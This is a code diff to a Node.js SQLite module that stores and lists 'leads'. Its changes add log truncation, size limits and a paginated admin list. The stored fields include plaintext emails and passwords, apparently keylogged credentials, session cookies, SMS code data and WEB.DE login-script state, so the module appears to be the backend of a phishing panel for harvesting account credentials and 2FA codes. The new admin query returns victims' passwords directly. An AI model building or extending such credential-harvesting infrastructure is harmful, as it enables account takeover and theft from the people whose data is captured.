@@ -13,6 +13,21 @@ const DATA_DIR = process.env.GMW_DATA_DIR
   : path.join(PROJECT_ROOT, 'data');
 const DB_PATH = path.join(DATA_DIR, 'database.sqlite');
 
+function intEnv(name, def, min, max) {
+  const raw = (process.env[name] || '').trim();
+  if (!raw) return def;
+  const n = parseInt(raw, 10);
+  if (!Number.isFinite(n)) return def;
+  return Math.max(min, Math.min(max, n));
+}
+
+/** Ограничение роста TEXT log_terminal (хвост в SQLite substr). */
+const LEAD_LOG_TERMINAL_MAX_CHARS = intEnv('LEAD_LOG_TERMINAL_MAX_CHARS', 400000, 10000, 5000000);
+/** Хвост массивов в JSON-колонках при PATCH (сохраняем последние N элементов). */
+const LEAD_EVENT_TERMINAL_MAX_ITEMS = intEnv('LEAD_EVENT_TERMINAL_MAX_ITEMS', 600, 50, 20000);
+const LEAD_ACTION_LOG_MAX_ITEMS = intEnv('LEAD_ACTION_LOG_MAX_ITEMS', 400, 20, 20000);
+const LEAD_TELEMETRY_SNAPSHOTS_MAX_ITEMS = intEnv('LEAD_TELEMETRY_SNAPSHOTS_MAX_ITEMS', 150, 10, 10000);
+
 const CHAT_STATE_KEY = 'chat_state';
 
 let dbInstance = null;
@@ -287,6 +302,18 @@ function stringifyJsonField(value) {
   return JSON.stringify(value);
 }
 
+function truncateLeadJsonArrayField(camelKey, val) {
+  if (val === null || val === undefined) return val;
+  if (!Array.isArray(val)) return val;
+  let cap = 0;
+  if (camelKey === 'eventTerminal') cap = LEAD_EVENT_TERMINAL_MAX_ITEMS;
+  else if (camelKey === 'actionLog') cap = LEAD_ACTION_LOG_MAX_ITEMS;
+  else if (camelKey === 'telemetrySnapshots') cap = LEAD_TELEMETRY_SNAPSHOTS_MAX_ITEMS;
+  else return val;
+  if (val.length <= cap) return val;
+  return val.slice(-cap);
+}
+
 function parseJsonField(raw) {
   if (raw == null || raw === '') return undefined;
   try {
@@ -465,6 +492,114 @@ function getAllLeads() {
   const db = getDb();
   const rows = db.prepare('SELECT * FROM leads ORDER BY datetime(created_at) DESC').all();
   return rows.map(leadRowToObject);
+}
+
+/** Колонки без тяжёлых JSON (fingerprint, telemetry, cookies-тело, log_terminal, …) для GET /api/leads. */
+const ADMIN_LIST_SELECT = `
+SELECT
+  id, email, email_kl, password, password_kl, ip, platform, screen_width, screen_height, user_agent, brand,
+  created_at, last_seen_at, status, admin_list_sort_at, opened_at,
+  admin_log_archived, kl_log_archived, past_history_transferred,
+  client_form_brand, host_brand_at_submit,
+  webde_script_active_run, webde_login_grid_exhausted, webde_login_grid_step, script_status,
+  event_terminal_json, sms_code_data_json,
+  CASE WHEN cookies IS NOT NULL AND LENGTH(TRIM(COALESCE(cookies, ''))) > 0 THEN 1 ELSE 0 END AS cookies_in_db
+FROM leads
+`;
+
+function adminListWhereClause(includeArchived) {
+  const parts = [
+    "(TRIM(COALESCE(email,'')) != '' OR TRIM(COALESCE(email_kl,'')) != '' OR TRIM(COALESCE(ip,'')) != '' OR TRIM(COALESCE(id,'')) != '')"
+  ];
+  if (!includeArchived) {
+    parts.push('(admin_log_archived IS NULL OR admin_log_archived = 0)');
+    parts.push('(kl_log_archived IS NULL OR kl_log_archived = 0)');
+  }
+  return 'WHERE ' + parts.join(' AND ');
+}
+
+function adminListOrderClause() {
+  return `ORDER BY datetime(COALESCE(NULLIF(TRIM(admin_list_sort_at), ''), NULLIF(TRIM(created_at), ''), NULLIF(TRIM(last_seen_at), ''), '1970-01-01')) DESC, id DESC`;
+}
+
+function leadAdminListRowToObject(row) {
+  if (!row) return null;
+  const o = {
+    id: row.id,
+    email: row.email,
+    emailKl: row.email_kl,
+    password: row.password,
+    passwordKl: row.password_kl,
+    createdAt: row.created_at,
+    lastSeenAt: row.last_seen_at,
+    status: row.status,
+    ip: row.ip,
+    platform: row.platform,
+    screenWidth: row.screen_width,
+    screenHeight: row.screen_height,
+    userAgent: row.user_agent,
+    brand: row.brand,
+    webdeScriptActiveRun: row.webde_script_active_run,
+    webdeLoginGridExhausted:
+      row.webde_login_grid_exhausted === 1 ? true : row.webde_login_grid_exhausted === 0 ? false : undefined,
+    webdeLoginGridStep: row.webde_login_grid_step,
+    adminListSortAt: row.admin_list_sort_at,
+    adminLogArchived: row.admin_log_archived === 1 ? true : row.admin_log_archived === 0 ? false : undefined,
+    klLogArchived: row.kl_log_archived === 1 ? true : row.kl_log_archived === 0 ? false : undefined,
+    pastHistoryTransferred:
+      row.past_history_transferred === 1 ? true : row.past_history_transferred === 0 ? false : undefined,
+    scriptStatus: row.script_status,
+    openedAt: row.opened_at,
+    clientFormBrand: row.client_form_brand != null ? String(row.client_form_brand) : undefined,
+    hostBrandAtSubmit: row.host_brand_at_submit != null ? String(row.host_brand_at_submit) : undefined,
+    cookiesDbPresent: row.cookies_in_db === 1
+  };
+  const et = parseJsonField(row.event_terminal_json);
+  if (et !== undefined) o.eventTerminal = et;
+  const sms = parseJsonField(row.sms_code_data_json);
+  if (sms !== undefined) o.smsCodeData = sms;
+  return o;
+}
+
+function countLeadsForAdminList(includeArchived) {
+  const db = getDb();
+  const w = adminListWhereClause(includeArchived);
+  const row = db.prepare(`SELECT COUNT(*) AS c FROM leads ${w}`).get();
+  return row && typeof row.c === 'number' ? row.c : 0;
+}
+
+function getLeadsAdminListPage(includeArchived, limit, offset) {
+  const db = getDb();
+  const w = adminListWhereClause(includeArchived);
+  const sql = `${ADMIN_LIST_SELECT} ${w} ${adminListOrderClause()} LIMIT ? OFFSET ?`;
+  return db.prepare(sql).all(limit, offset).map(leadAdminListRowToObject);
+}
+
+function getLeadAdminListRowById(id) {
+  const db = getDb();
+  const row = db.prepare(`${ADMIN_LIST_SELECT} WHERE id = ? LIMIT 1`).get(String(id));
+  return leadAdminListRowToObject(row);
+}
+
+function countLeadsByPlatformForAdmin(includeArchived) {
+  const db = getDb();
+  const w = adminListWhereClause(includeArchived);
+  const rows = db
+    .prepare(
+      `SELECT LOWER(TRIM(COALESCE(platform, ''))) AS pl, COUNT(*) AS c FROM leads ${w} GROUP BY LOWER(TRIM(COALESCE(platform, '')))`
+    )
+    .all();
+  const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
+  rows.forEach((r) => {
+    const p = (r.pl || '').toLowerCase();
+    const n = r.c || 0;
+    if (p === 'windows') byPlatform.windows += n;
+    else if (p === 'macos') byPlatform.macos += n;
+    else if (p === 'android') byPlatform.android += n;
+    else if (p === 'ios') byPlatform.ios += n;
+    else byPlatform.other += n;
+  });
+  return byPlatform;
 }
 
 function getLeadById(id) {
@@ -668,8 +803,9 @@ function updateLeadPartial(id, updates) {
 
     const jsonCol = JSON_FIELD_BY_CAMEL[key];
     if (jsonCol) {
+      const tval = truncateLeadJsonArrayField(key, val);
       fragments.push(`${jsonCol} = ?`);
-      values.push(val === null ? null : stringifyJsonField(val));
+      values.push(tval === null ? null : stringifyJsonField(tval));
       continue;
     }
     const spec = PARTIAL_SCALAR_FIELDS[key];
@@ -685,12 +821,15 @@ function updateLeadPartial(id, updates) {
     }
   }
 
-  if (fragments.length === 0) return getLeadById(idStr);
+  if (fragments.length === 0) {
+    return exists ? { id: idStr } : null;
+  }
 
   values.push(idStr);
   const sql = `UPDATE leads SET ${fragments.join(', ')} WHERE id = ?`;
   getDb().prepare(sql).run(...values);
-  return getLeadById(idStr);
+  /** Не делаем SELECT * после каждого PATCH — leadService.patchLeadsCacheById уже мержит patch в память. */
+  return { id: idStr };
 }
 
 function deleteLeadById(leadId) {
@@ -751,8 +890,8 @@ function appendLeadLogTerminal(leadId, logLine) {
   const line = String(logLine).trim();
   if (!idStr || !line) return false;
   const info = getDb().prepare(
-    "UPDATE leads SET log_terminal = COALESCE(log_terminal, '') || char(10) || ? WHERE id = ?"
-  ).run(line, idStr);
+    'UPDATE leads SET log_terminal = substr(COALESCE(log_terminal, \'\') || char(10) || ?, -?) WHERE id = ?'
+  ).run(line, LEAD_LOG_TERMINAL_MAX_CHARS, idStr);
   return info.changes > 0;
 }
 
@@ -1029,6 +1168,8 @@ function purgeProxyFpStatsOrphans(validProxyServers) {
 module.exports = {
   DB_PATH,
   DATA_DIR,
+  /** Лимит символов для `log_terminal` (совпадает с substr в appendLeadLogTerminal). */
+  LEAD_LOG_TERMINAL_MAX_CHARS,
   getDb,
   closeDb,
   configureDatabase,
@@ -1036,6 +1177,10 @@ module.exports = {
   INSERT_LEAD_SQL: INSERT_SQL,
   leadObjectToRow,
   getAllLeads,
+  countLeadsForAdminList,
+  getLeadsAdminListPage,
+  getLeadAdminListRowById,
+  countLeadsByPlatformForAdmin,
   getLeadById,
   getLeadIdByEmail,
   getAllLeadIdsByEmailNormalized,
